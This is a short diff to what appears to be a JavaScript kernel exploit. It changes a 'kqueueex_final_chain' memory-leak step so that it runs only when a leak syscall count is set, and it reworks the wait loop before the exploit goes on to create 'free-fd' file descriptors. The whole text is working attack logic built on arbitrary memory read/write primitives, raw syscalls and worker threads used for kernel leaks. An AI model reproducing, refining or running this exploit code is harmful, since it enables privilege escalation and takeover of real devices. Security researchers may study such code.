@@ -1109,8 +1109,13 @@
                     normal: normal_w, queued: 0n
                 });
             }
-            const final_chain_done_ptr = malloc(8);
-            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
+
+            let final_chain_entry = null;
+            let final_chain_done_ptr = null;
+            if (LEAK_SYSCALLS_FINAL > 0n) {
+                final_chain_done_ptr = malloc(8);
+                final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
+            }
 
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             const _sleep_ts = malloc(16);
@@ -1172,15 +1177,20 @@
                 syscall(SYSCALL.close, lw.wfd_big);
             }
 
-            logger.log("launching kqueueex_final_chain...");
-            write64_uncompressed(final_chain_done_ptr, 0n);
-            spawn_leak_worker(final_chain_entry);
-            logger.log("Waiting for kqueueex_final_chain to complete...");
-            while (read64_uncompressed(final_chain_done_ptr) === 0n) {
+            if (final_chain_entry !== null) {
+                logger.log("launching kqueueex_final_chain...");
+                write64_uncompressed(final_chain_done_ptr, 0n);
                 nanosleep_ms(500);
+                spawn_leak_worker(final_chain_entry);
+
+                while (true) {
+                    nanosleep_ms(200);
+                    if (read64_uncompressed(final_chain_done_ptr) !== 0n) break;
+                }
+                logger.log("kqueueex_final_chain finished successfully");
             }
 
-            logger.log("kqueueex_final_chain finished successfully. preparing free-fd");
+            logger.log("preparing free-fd");
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
                 if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
